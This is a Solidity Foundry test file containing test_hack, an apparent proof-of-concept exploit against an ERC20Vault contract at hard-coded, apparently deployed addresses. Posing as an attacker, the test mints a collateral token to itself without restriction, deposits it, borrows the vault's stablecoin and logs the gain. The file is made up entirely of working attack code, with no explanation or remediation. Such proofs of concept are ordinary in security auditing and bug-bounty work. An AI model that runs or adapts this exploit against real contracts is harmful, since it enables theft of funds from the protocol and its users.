// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ERC20Vault} from "../src/oasis/usd/ERC20Vault.sol";

interface IERC20 {
     function mint(address, uint256) external ;
     function approve(address, uint256) external;
     function balanceOf(address) external returns(uint256);
}
contract CounterTest is Test {
    IERC20 public token;
    ERC20Vault public erc20Vault;
    IERC20 public stablecoin ;
    address public attacker = makeAddr("Attacker");

    function setUp() public {
        token = IERC20(0x641249dB01d5C9a04d1A223765fFd15f95167924);
        erc20Vault = ERC20Vault(0x75a04A1FeE9e6f26385ab1287B20ebdCbdabe478);
        stablecoin = IERC20(address(erc20Vault.stablecoin()));
    }

    function test_hack() public {
        vm.startPrank(attacker);
       token.mint(attacker, 1000 ether);
       token.approve(address(erc20Vault), 1000 ether);
       erc20Vault.addCollateral(1000 ether);
              console.log(block.number);

       console.log("balance of attacker before hack::", stablecoin.balanceOf(attacker));
       erc20Vault.borrow(1000 ether);
       console.log("balance of attacker after hack::", stablecoin.balanceOf(attacker));
       vm.stopPrank();

    }
   
}
